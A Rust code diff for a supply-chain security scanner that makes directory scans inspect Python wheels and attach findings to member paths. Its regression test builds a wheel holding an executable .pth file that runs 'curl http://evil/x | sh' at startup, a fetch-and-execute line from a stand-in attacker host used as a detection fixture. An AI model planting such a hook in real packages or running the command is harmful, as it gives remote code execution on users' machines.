@@ -214,17 +214,28 @@ pub fn scan(config: &ScanConfig) -> ScanResult {
         &config.exclude_patterns,
     );
     let mut files = collected.text_candidates;
-    // Artifact candidates (`.so`/`.whl`/...) have no analyzer yet; each becomes
-    // an `Unsupported` coverage gap so they are never silently dropped.
-    let mut coverage_gaps: Vec<CoverageGap> = collected
-        .artifact_candidates
-        .iter()
-        .map(|p| CoverageGap {
-            location: SubjectLocation::from_path(p.clone()),
-            kind: CoverageGapKind::Unsupported,
-            sha256: hash_path_within_budget(p),
-        })
-        .collect();
+    // B8a — magic-dispatch each artifact candidate (`.whl`/`.so`/...) into the real
+    // artifact scanner instead of recording a blanket `Unsupported` gap. A wheel is
+    // inspected (A4 reader + B5/B6/B7) and its findings become member-qualified
+    // `FileScanResult`s that flow through the existing JSON/SARIF/exit path; an
+    // unsupported/unreadable candidate (an sdist, a bare `.so` with no archive
+    // wrapper, an oversize file) still records a coverage gap so it is never
+    // silently dropped.
+    let mut coverage_gaps: Vec<CoverageGap> = Vec::new();
+    let mut artifact_results: Vec<FileScanResult> = Vec::new();
+    // Distinct artifacts that were actually inspected (NOT the per-finding result
+    // count), so `scanned_count` reflects files scanned, not findings produced.
+    let mut artifacts_inspected = 0usize;
+    for p in &collected.artifact_candidates {
+        let (mut results, gap) = inspect_artifact_candidate(p);
+        if gap.is_none() {
+            artifacts_inspected += 1;
+        }
+        artifact_results.append(&mut results);
+        if let Some(gap) = gap {
+            coverage_gaps.push(gap);
+        }
+    }
 
     files.sort_by(|a, b| {
         let a_priority = is_priority_file(a);
@@ -252,6 +263,12 @@ pub fn scan(config: &ScanConfig) -> ScanResult {
     }
 
     let mut file_results = Vec::new();
+    // Artifact-inspection findings (member-qualified) join the file results so they
+    // flow through the same JSON/SARIF/human emitters and exit-code logic. They are
+    // counted once per artifact (`artifacts_inspected`), not once per result, so a
+    // wheel with several findings still counts as one scanned file.
+    file_results.append(&mut artifact_results);
+    let mut text_files_scanned = 0usize;
     let mut panic_files = Vec::new();
     for file_path in &files {
         // Panic in any rule is bounded to its file; the rest of the walk
@@ -260,6 +277,7 @@ pub fn scan(config: &ScanConfig) -> ScanResult {
         // size/IO skips; it is ALSO pushed as a `Panicked` coverage gap.
         match scan_single_file_guarded(file_path) {
             GuardedScanOutcome::Completed(ScanFileOutcome::Scanned(result)) => {
+                text_files_scanned += 1;
                 file_results.push(result)
             }
             GuardedScanOutcome::Completed(ScanFileOutcome::Skipped(gap)) => {
@@ -275,7 +293,9 @@ pub fn scan(config: &ScanConfig) -> ScanResult {
     }
 
     ScanResult {
-        scanned_count: file_results.len(),
+        // Files scanned = text files + distinct artifacts inspected (a wheel with
+        // multiple findings is one scanned file, not several).
+        scanned_count: text_files_scanned + artifacts_inspected,
         skipped_count,
         truncated,
         truncation_reason,
@@ -283,6 +303,110 @@ pub fn scan(config: &ScanConfig) -> ScanResult {
         coverage_gaps,
         file_results,
     }
+}
+
+/// Magic-dispatch one artifact candidate into the artifact scanner (B8a). Returns
+/// the member-qualified [`FileScanResult`]s its findings produce, plus an optional
+/// [`CoverageGap`] when the candidate could not be inspected as a wheel (an sdist /
+/// unknown magic / unreadable / oversize), so an artifact is never silently
+/// dropped. A successfully inspected wheel with NO findings still yields one empty
+/// result (located at the wheel) so it counts as scanned.
+///
+/// Each finding becomes its OWN result located at the finding's member-qualified
+/// path (`foo.whl!/pkg/bootstrap.pth`, B8f) when one is recoverable from the
+/// finding's evidence, else the outer wheel path — so JSON/SARIF show the offending
+/// member, not just the container. Policy override finalization is applied via
+/// `evaluate_inspected_artifact` so a strict integrity policy's `action_overrides`
+/// are honored on this path too (the verdict's findings carry the overridden
+/// severities).
+fn inspect_artifact_candidate(path: &Path) -> (Vec<FileScanResult>, Option<CoverageGap>) {
+    use crate::artifact::inspect::{inspect_artifact_file, InspectedArtifact};
+
+    let inspected: InspectedArtifact = match inspect_artifact_file(path) {
+        Ok(i) => i,
+        Err(e) => {
+            // Not inspectable as a wheel: record a coverage gap (best-effort hash
+            // for a later content-addressed lookup) so it is never read as clean.
+            return (
+                Vec::new(),
+                Some(CoverageGap {
+                    location: SubjectLocation::from_path(path.to_path_buf()),
+                    kind: e.gap_kind(),
+                    sha256: hash_path_within_budget(path),
+                }),
+            );
+        }
+    };
+
+    // Discover the operator policy for this path so per-rule severity/action
+    // overrides are honored (the artifact path is a static-verdict site too).
+    let cwd = path
+        .parent()
+        .map(|p| p.display().to_string())
+        .filter(|s| !s.is_empty());
+    let policy = crate::policy::Policy::discover(cwd.as_deref());
+
+    let verdict = crate::artifact::evaluate_inspected_artifact(
+        &inspected.inspection,
+        &inspected.native_findings,
+        &policy,
+        None,
+    );
+
+    let mut results: Vec<FileScanResult> = Vec::new();
+    for finding in verdict.findings {
+        // Locate the finding at its member-qualified location when one is present in
+        // the evidence (B8f); else at the outer wheel.
+        let loc = artifact_finding_location(&finding, path);
+        results.push(FileScanResult {
+            path: loc,
+            findings: vec![finding],
+            is_config_file: false,
+        });
+    }
+
+    // A clean wheel (no findings) still counts as scanned: emit one empty result at
+    // the outer wheel path.
+    if results.is_empty() {
+        results.push(FileScanResult {
+            path: path.to_path_buf(),
+            findings: Vec::new(),
+            is_config_file: false,
+        });
+    }
+
+    (results, None)
+}
+
+/// Recover the member-qualified location (`foo.whl!/member`) for an artifact
+/// finding from the first `outer!/member` token in its evidence; else the outer
+/// artifact path. Used so each artifact finding's JSON/SARIF path names the
+/// offending member (B8f).
+fn artifact_finding_location(finding: &Finding, outer: &Path) -> PathBuf {
+    use crate::verdict::Evidence;
+    let outer_display = outer.display().to_string();
+    for ev in &finding.evidence {
+        if let Evidence::Text { detail } = ev {
+            // A member-qualified location renders `<outer>!/<member>`; find the first
+            // such token that names THIS outer artifact.
+            for token in detail.split_whitespace() {
+                let cleaned = token.trim_matches(|c| matches!(c, '\'' | '"' | '(' | ')' | ','));
+                if let Some(idx) = cleaned.find("!/") {
+                    let (outer_part, _) = cleaned.split_at(idx);
+                    // Match on the basename so a relative vs absolute outer path
+                    // still attaches to this artifact.
+                    let outer_base = outer
+                        .file_name()
+                        .and_then(|n| n.to_str())
+                        .unwrap_or(&outer_display);
+                    if outer_part.ends_with(outer_base) || outer_part == outer_display {
+                        return PathBuf::from(cleaned);
+                    }
+                }
+            }
+        }
+    }
+    outer.to_path_buf()
 }
 
 /// Maximum analyzable content size: 10 MiB. Large enough for any realistic
@@ -1367,6 +1491,88 @@ mod tests {
         assert!(
             !names.contains(&"artifact.md"),
             "files under out/.turbo/coverage/.expo should be skipped, got {names:?}"
+        );
+    }
+
+    /// B8a regression: a directory scan over a tree containing a `.whl` must
+    /// actually INSPECT the wheel (A2 dropped artifact candidates during collection,
+    /// so the wheel was never opened). A wheel with an executable `.pth` must surface
+    /// the startup finding rather than a blanket `Unsupported` coverage gap.
+    #[test]
+    fn test_directory_scan_inspects_wheel_member() {
+        use std::io::Write as _;
+        use zip::write::SimpleFileOptions;
+        use zip::ZipWriter;
+
+        let tmp = tempfile::tempdir().expect("create temp dir");
+        let root = tmp.path();
+        // A benign text file alongside the wheel.
+        std::fs::write(root.join("README.md"), "hello").unwrap();
+
+        // A wheel bundling an executable `.pth` that spawns a subprocess at startup.
+        let mut zw = ZipWriter::new(std::io::Cursor::new(Vec::new()));
+        for (name, body) in [
+            (
+                "evil.pth",
+                b"import os; os.system('curl http://evil/x | sh')\n".as_slice(),
+            ),
+            (
+                "demo-1.0.dist-info/METADATA",
+                b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\n".as_slice(),
+            ),
+            (
+                "demo-1.0.dist-info/RECORD",
+                b"demo-1.0.dist-info/RECORD,,\n".as_slice(),
+            ),
+        ] {
+            zw.start_file(name, SimpleFileOptions::default()).unwrap();
+            zw.write_all(body).unwrap();
+        }
+        let wheel_bytes = zw.finish().unwrap().into_inner();
+        std::fs::write(root.join("demo-1.0-py3-none-any.whl"), &wheel_bytes).unwrap();
+
+        let config = ScanConfig {
+            path: root.to_path_buf(),
+            recursive: true,
+            fail_on: Severity::High,
+            ignore_patterns: Vec::new(),
+            include_patterns: Vec::new(),
+            exclude_patterns: Vec::new(),
+            max_files: None,
+        };
+        let result = scan(&config);
+
+        // The wheel was inspected, not dropped: no `Unsupported` gap for it.
+        assert!(
+            !result
+                .coverage_gaps
+                .iter()
+                .any(|g| g.kind == CoverageGapKind::Unsupported),
+            "the wheel must be inspected, not recorded as an Unsupported gap: {:?}",
+            result.coverage_gaps
+        );
+        // The executable `.pth` fired the B6 startup finding.
+        assert!(
+            result
+                .file_results
+                .iter()
+                .flat_map(|r| &r.findings)
+                .any(|f| f.rule_id == crate::verdict::RuleId::PythonStartupHookSuspicious),
+            "a directory scan over a wheel with an executable .pth must fire the startup \
+             finding; results: {:?}",
+            result
+                .file_results
+                .iter()
+                .flat_map(|r| r.findings.iter().map(|f| f.rule_id))
+                .collect::<Vec<_>>()
+        );
+        // The finding is located at the member-qualified path (B8f).
+        assert!(
+            result
+                .file_results
+                .iter()
+                .any(|r| { !r.findings.is_empty() && r.path.display().to_string().contains("!/") }),
+            "an artifact finding must carry a member-qualified `foo.whl!/member` path"
         );
     }
 
